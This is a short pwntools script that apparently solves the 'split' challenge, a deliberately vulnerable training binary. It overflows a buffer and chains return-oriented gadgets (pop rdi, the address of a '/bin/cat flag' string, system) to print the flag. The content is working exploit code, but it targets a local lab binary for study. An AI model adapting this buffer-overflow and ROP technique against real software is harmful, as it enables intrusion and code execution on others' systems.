from pwn import *

exe = ELF("./split", checksec=False)
rop = ROP(exe)

pop_rdi = 0x4007c3
bin_cat_flag = 0x601060
system = 0x40074b
ret = 0x40053e

payload  = b'A' * 40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_cat_flag)
payload += p64(exe.symbols['system'])

p = process(exe.path)
p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)